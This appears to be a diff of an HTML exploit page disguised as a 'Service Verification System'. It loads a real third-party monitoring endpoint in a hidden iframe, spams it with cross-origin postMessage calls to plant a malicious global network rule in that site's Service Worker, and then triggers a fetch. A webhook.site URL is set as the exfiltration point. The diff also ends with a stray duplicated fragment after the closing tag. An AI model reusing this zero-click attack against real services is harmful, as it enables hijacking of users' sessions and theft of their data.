@@ -1,29 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verification System</title>
+    <title>Service Verification System</title>
 </head>
 <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
     <div style="border: 1px solid #0f0; display: inline-block; padding: 20px;">
-        <h1 id="status">[ PHASE 1: TARGETING ]</h1>
-        <p id="sub-status">Locating vulnerable Service Worker scope...</p>
+        <h1 id="status">[ INITIALIZING ]</h1>
+        <p id="sub-status">Connecting to mon.tiktokv.com...</p>
     </div>
 
     <iframe id="pwn_gate" 
-            src="https://shop-id.tokopedia.com/manifest.json" 
+            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
             style="display:none;"></iframe>
 
     <script>
         const gate = document.getElementById('pwn_gate');
         const statusH1 = document.getElementById('status');
         const statusP = document.getElementById('sub-status');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI ID LU
+        
+        // GANTI INI DENGAN ID WEBHOOK LU
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "final_pwn_stable",
+                ruleName: "zero_click_final_v6",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -34,6 +36,52 @@
                 }]
             }]
         };
+
+        gate.onload = function() {
+            statusH1.innerText = "[ INJECTING ]";
+            statusP.innerText = "Sending cross-origin message...";
+            
+            // 1. Wake up call agar Service Worker aktif mendengarkan
+            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
+
+            setTimeout(() => {
+                // 2. Kirim payload rule secara berulang (spam)
+                let count = 0;
+                const bomb = setInterval(() => {
+                    try {
+                        gate.contentWindow.postMessage(payload, "*");
+                    } catch(e) {}
+                    
+                    count++;
+                    if (count > 40) {
+                        clearInterval(bomb);
+                        statusH1.innerText = "[ WAITING ]";
+                        statusP.innerText = "Syncing with Cache Storage (10s)...";
+                        
+                        // 3. JEDA KRUSIAL: Beri waktu Service Worker menulis ke cache internal
+                        setTimeout(executeFinalTrigger, 10000);
+                    }
+                }, 100);
+            }, 1000);
+        };
+
+        function executeFinalTrigger() {
+            statusH1.innerText = "[ TRIGGERING ]";
+            statusP.innerText = "PNS Logic Interception in progress...";
+            
+            // 4. Trigger fetch ke endpoint yang sama (200 OK)
+            // Ini akan memaksa Service Worker yang sudah terinfeksi memproses request
+            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
+                mode: 'no-cors',
+                cache: 'no-store' 
+            }).then(() => {
+                statusH1.innerText = "[ COMPLETED ]";
+                statusP.innerText = "Check Reqable for X-Pns-Referrer on browser-settings request";
+            });
+        }
+    </script>
+</body>
+</html>
 
         gate.onload = function() {
             statusH1.innerText = "[ PHASE 2: INJECTING ]";
